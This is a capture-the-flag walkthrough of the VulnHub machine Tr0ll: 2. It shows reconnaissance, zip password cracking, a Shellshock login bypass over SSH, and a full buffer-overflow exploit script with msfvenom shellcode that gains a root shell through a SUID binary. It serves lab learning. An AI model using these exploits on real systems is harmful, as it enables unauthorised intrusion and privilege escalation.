# Tr0ll: 2

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Tr0ll: 2 | Maleus | Beginner++ | VulnHub |

## Recon

I identified the target host on the local subnet and performed full TCP service enumeration.

```bash
└─$ cat arp-scan.txt
Interface: eth0, type: EN10MB, MAC: 00:0c:29:34:92:a3, IPv4: 192.168.1.124
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	ec:4d:47:0b:94:4d	HUAWEI TECHNOLOGIES CO.,LTD
192.168.1.64	9c:52:f8:82:50:1c	HUAWEI TECHNOLOGIES CO.,LTD
192.168.1.69	2c:6f:c9:3e:16:fd	Hon Hai Precision Ind. Co.,Ltd.
192.168.1.68	34:db:9c:3a:e9:17	Sagemcom Broadband SAS
192.168.1.74	34:db:9c:3a:e8:1f	Sagemcom Broadband SAS
192.168.1.65	7e:2d:55:cc:dd:25	(Unknown: locally administered)
192.168.1.128	00:0c:29:46:08:55	VMware, Inc.

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.154 seconds (118.85 hosts/sec). 7 responded
```

```bash
└─$ nmap -sC -sV -p- 192.168.1.128
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-05 16:19 -0400
Nmap scan report for Tr0ll2.lan (192.168.1.128)
Host is up (0.0012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:46:08:55 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.17 ms Tr0ll2.lan (192.168.1.128)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds
```

I perfomed a directory enumeration to find common subdirectories

```bash
gobuster dir -url http://192.168.1.128/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.128/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 110]
robots               (Status: 200) [Size: 346]
server-status        (Status: 403) [Size: 294]
===============================================================
Finished
===============================================================
```

Obtained the robots file

```bash
curl -s "http://192.168.1.128/robots"
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

Retried directory enumeration but now with the new subdirectories found

```bash
gobuster dir -url http://192.168.1.128/ -w 4.robots.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.128/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                4.robots.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
noob                 (Status: 301) [Size: 313] [--> http://192.168.1.128/noob/]
keep_trying          (Status: 301) [Size: 320] [--> http://192.168.1.128/keep_trying/]
dont_bother          (Status: 301) [Size: 320] [--> http://192.168.1.128/dont_bother/]
ok_this_is_it        (Status: 301) [Size: 322] [--> http://192.168.1.128/ok_this_is_it/]
===============================================================
Finished
===============================================================
```

Found several fotos. Index had the only distinct one.  
<img width="241" height="240" alt="imagem" src="https://github.com/user-attachments/assets/eed24201-5b86-4b65-92bf-b86728c1a97e" />
<img width="437" height="264" alt="imagem" src="https://github.com/user-attachments/assets/69afb184-2c72-4d28-adf4-c2d3ce53355a" />

So I checked for strings around the images on all the above directories and found on dont_bother:  

```bash
@Si;X'
f02HP
8Jh;
gYCJ
pV}A
7U	4
]=%em;
lj\p
*/ p?E$
Look Deep within y0ur_self for the answer
```

## Footholding

which lead to another website  

<img width="810" height="434" alt="imagem" src="https://github.com/user-attachments/assets/55e6bd2b-8cb7-47da-a51d-606ecd4a4fc7" />  

proceeded to download the file & checked index for clues  

``` bash
curl -s "http://192.168.1.128/y0ur_self/answer.txt" | tee answer.txt
curl -s "http://192.168.1.128/"
<html>
<img src='tr0ll_again.jpg'>
</html>
<!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>
```

The file had a base64 enconding which was reversed with:  

``` bash
base64 -d 8.answer.txt > 9.answer_decoded.txt
```

Then I tried to get into ftp using username: Tr0ll and Password: Tr0ll  

``` bash
ftp 192.168.1.128
```

<img width="567" height="355" alt="imagem" src="https://github.com/user-attachments/assets/f6a00313-fe5d-4c5a-abd3-4679dc2ac367" />  
 
This lead me to a zip file with a password  

<img width="391" height="151" alt="imagem" src="https://github.com/user-attachments/assets/46ae060d-7c71-4919-bdb8-adae36251ad8" />  

The next step was hashing the zip so we could bruteforce it with the decoded base64 file we just got  

``` bash
zip2john lmao.zip > 11.lmao.hash
john -wordlist:9.answer_decoded.txt 11.lmao.hash
```

A match was found which would likely unzip the file  

<img width="546" height="221" alt="imagem" src="https://github.com/user-attachments/assets/7d6dc97b-0b7c-4f2b-b22d-a0952e459050" />  

``` bash
zip2john lmao.zip > 11.lmao.hash
john -wordlist:9.answer_decoded.txt 11.lmao.hash
```

<img width="554" height="561" alt="imagem" src="https://github.com/user-attachments/assets/3640fc42-30b9-4bf9-993c-4c59fefcd247" />  

## Entering the machine

So with this new RSA key we could try to login into SSH with username: noob  

``` bash
ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i noob noob@192.168.1.128
```

<img width="465" height="179" alt="imagem" src="https://github.com/user-attachments/assets/8107ac0c-2894-4ee6-b306-027af7755f7a" />  

This failed, however we could try the shellshock exploit since this VM was upload during that time  

``` bash
ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i noob -t noob@192.168.1.128 "() { :;}; /bin/bash"
```

<img width="575" height="216" alt="imagem" src="https://github.com/user-attachments/assets/7ad0654d-0487-4b81-b23a-e35332c41502" />  

## Priviledge Escalation   

Now that we have access, we can explore. No luck on normal directories such has /opt, /tmp or others. Therefore the next step was looking for known CVEs for this machine's version  

<img width="572" height="473" alt="imagem" src="https://github.com/user-attachments/assets/7f3b1a5a-9c0a-4d4c-a7ea-6a5e992fe842" />  

After looking around on searchploit and exploitdb and even trying a few, at the best of my knowledge I couldn't get a priveledge escalation CVE to work.  

I tried checking directories and found some interesting stuff:  

<img width="574" height="580" alt="imagem" src="https://github.com/user-attachments/assets/a6ca778a-93b8-4268-ab1c-32fc60227efc" />  

Some folders with executables in them. And to make things better some of them had the SUID bit on, which means that if we can hijack the process we have root priveledge to execute whatever command we inject the process with.  

After sometime I noticed that the executables move around directories, which means we had to check them periodically. After disassembling the main function we could find a strcpy function:  

<img width="495" height="563" alt="imagem" src="https://github.com/user-attachments/assets/9ab4a328-a09c-4e44-a159-6cb3062d9212" />  

Which is exactly what we want and need to hijack the process.  

With a few help from msfvenom we can craft a fast payload to check for bufferoverflow offsets  

```bash
msf-pattern_create -l 300
msf-pattern_offset -q 0x6a413969
python -c 'print "A"*268 + "B"*4 + "\x90"*150' > /tmp/payload
```

<img width="572" height="576" alt="imagem" src="https://github.com/user-attachments/assets/d7f2e856-d364-4992-9892-e7ec5f7d21a7" />  

We found that the EIP address has value 0x6a413969 which corresponds to a 268 byte offset  

<img width="527" height="494" alt="imagem" src="https://github.com/user-attachments/assets/2adb62e4-1603-490e-b005-dc16e335248a" />  

We can validade that after sending python -c 'print "A"*268 + "B"*4 + "\x90"*150' as input, now the EIP has 0x42424242 which corresponds to 4 * B  

This means that our offset calculations were correct and now we can hijack the process. We can achieve this by changing the EIP value to another register.  

This register will be chosen carefully to guarantee the CPU's intructions end up were we want them to. The \x90 value represents a NoOp, which means the CPU skips this intructions and reads the next.  

A NoOp sled is when we inject a set of NoOps into the CPU eventually leading to a carefully crafted payload which contains intructions of a command to execute. This ensures that we have a margin for dynamic stack changes.  

<img width="508" height="566" alt="imagem" src="https://github.com/user-attachments/assets/8ce59d5b-8d8b-49fe-9948-a0bd8d57d4d5" />  

The only thing remaining is setting our EIP to an address that contains the \x90 values. Any would do.  

We use msfvenom once again to craft in hex the command we want to run  

```bash
msfvenom -p linux/x86/exec -f python CMD="/bin/sh" -b '\x00'
```

Then we execute a payload I designed  

```bash
#!/usr/bin/env python
import struct

# =========================================================
# 0. FINDING LOCATIONS
# =========================================================
# msf-pattern_create -l 300
# msf-pattern_offset -q <output>
# python3 -c "import sys; sys.stdout.buffer.write(b'A'*268 + b'B'*4 + b'\x90'*150)" > payload.bin
# python -c 'print "A"*268 + "B"*4 + "\x90"*150' > payload


# =========================================================
# 1. TARGET SETTINGS
# =========================================================
# How many "A"s to reach EIP?
padding_size = 268 

# Address we want EIP to jumpo to
# struct.pack("<I", ...) converts into Little Endian
# Example: 0x08041234 becomes \x34\x12\x04\x08
return_addr = struct.pack("<I", 0xbffffb04) 

# =========================================================
# 2. PAYLOAD (Shellcode)
# =========================================================
# This shellcode executes: setreuid(0,0) + execve("/bin/sh")
# When the binary has the SUID bit this allows us to become root
# msfvenom -p linux/x86/exec -f python CMD="/bin/sh" -b '\x00'
shellcode = (
	"\xbe\xf3\xa9\xca\xf8\xd9\xf6\xd9\x74\x24\xf4\x5d"
	"\x33\xc9\xb1\x0b\x31\x75\x15\x03\x75\x15\x83\xed"
	"\xfc\xe2\x06\xc3\xc1\xa0\x71\x46\xb0\x38\xac\x04"
	"\xb5\x5e\xc6\xe5\xb6\xc8\x16\x92\x17\x6b\x7f\x0c"
	"\xe1\x88\x2d\x38\xf9\x4e\xd1\xb8\xd5\x2c\xb8\xd6"
	"\x06\xc2\x52\x27\x0e\x77\x2b\xc6\x7d\xf7"
)

# NOPs sled. Compensates stack variations
nops = "\x90" * 200

# =========================================================
# 3. MOUNT
# =========================================================
# Structure: [PADDING] + [JUMP ADDRESS] + [NOPs] + [SHELLCODE]
payload = "A" * padding_size + return_addr + nops + shellcode

# Run : ./<file> "$(python3 binary_exploitation.py)"
print payload
```

And we run it as input for the executable   

<img width="539" height="268" alt="imagem" src="https://github.com/user-attachments/assets/88a7b5b5-e8d4-43a2-84cd-5af65dae72d3" />  

And there we go. 
